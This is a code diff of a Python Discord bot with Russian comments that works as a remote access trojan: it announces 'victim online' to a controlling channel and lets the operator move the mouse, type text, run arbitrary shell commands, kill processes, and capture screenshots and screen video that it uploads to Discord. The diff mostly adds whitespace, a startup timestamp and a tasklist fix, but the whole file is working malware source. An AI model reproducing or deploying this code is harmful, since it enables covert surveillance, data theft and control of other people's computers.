@@ -1,6 +1,8 @@
 '''Made by NullifiedVlad 
    ты не станешь крутым программистом если
    просто скопируешь его!'''
+
+
 import discord
 from discord.ext import commands
 import pyautogui as pg
@@ -11,29 +13,37 @@ from playsound import playsound
 import numpy as np
 import cv2
 import config
+import datetime
 
 
 pg.FAILSAFE = False
-
 bot = commands.Bot(command_prefix='!') # префикс для комманд
 channel = bot.get_channel(config.channel) # введите id канала в который должен писать бот
 bot.remove_command('help')
+
+
 @bot.event 
 async def on_ready():
-	channel = bot.get_channel(config.channel)
-	await channel.send(f'CAT: Жертва онлайн!')
+    channel = bot.get_channel(config.channel)
+    await channel.send(f'CAT: Жертва онлайн!')
+    date =  datetime.datetime.now()
+    await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))
+
 @bot.command()
 async def status(ctx):
     await ctx.send(f'ОС: {sys.platform}')
+    
 @bot.command()
 async def move(ctx,x,y,time): # перемещение курсора
     pg.moveTo(int(x),int(y),float(time))
     await ctx.send('CAT: Курсор был передвинут на X:' + str(x) +' Y:' + str(y))
 
+
 @bot.command()
 async def click(ctx): # кликнуть мышкой
     await ctx.send('CAT: Был сделан клик!')
     pg.click()
+
 
 @bot.command()
 @commands.has_permissions(administrator = True)
@@ -41,6 +51,7 @@ async def screenshot(ctx): # сделать скриншот
     pg.screenshot('screenshot.png')
     await ctx.send(file=discord.File('screenshot.png'))
     os.remove('screenshot.png' )
+
 
 @bot.command()
 async def changelanguage(ctx): #смена раскладки
@@ -51,6 +62,8 @@ async def changelanguage(ctx): #смена раскладки
 async def write(ctx,*,text): # написать текс
     pg.typewrite(text)
     await ctx.send(f"CAT: Был набран текст: {text}")
+
+
 @bot.command()
 async def playsound(ctx,sound): # проиграть звук
     if int(sound) == 1:
@@ -59,6 +72,8 @@ async def playsound(ctx,sound): # проиграть звук
     elif int(sound) == 2: 
         playsound('sounds/Sound2.mp3')
         await ctx.send('CAT: Звук проигран!')
+
+
 @bot.command()
 async def send(ctx,key,how_many): #нажать клавишу
     a = 0
@@ -77,6 +92,7 @@ async def command(ctx,*,command):
     else:
         await ctx.send('CAT: Ошибка выполения!')
 
+
 @bot.command()
 async def kill(ctx,*,process):
     output = os.system(f'taskkill /im {str(process)} /f')
@@ -86,7 +102,8 @@ async def kill(ctx,*,process):
         await ctx.send('CAT: Такого процесса нет!')
 @bot.command()
 async def processlist(ctx):
-    await ctx.send(subprocess.check_output(['taskkill']))
+    await ctx.send(subprocess.check_output(['tasklist']))
+
 
 @bot.command()
 async def video(ctx,how_many): #запись видео
@@ -97,6 +114,7 @@ async def video(ctx,how_many): #запись видео
     fourcc = cv2.VideoWriter_fourcc(*'mp4v')
     out = cv2.VideoWriter(output, fourcc, 20.0, (width, height))
     loop = 0
+
     while int(loop) <= int(how_many):
         try:
             img = pg.screenshot()
@@ -107,7 +125,9 @@ async def video(ctx,how_many): #запись видео
         except KeyboardInterrupt:
             break
     await ctx.send(file=discord.File('video.avi'))
+
     os.remove(output)
     out.release()
     cv2.destroyAllWindows()
+
 bot.run(config.token)
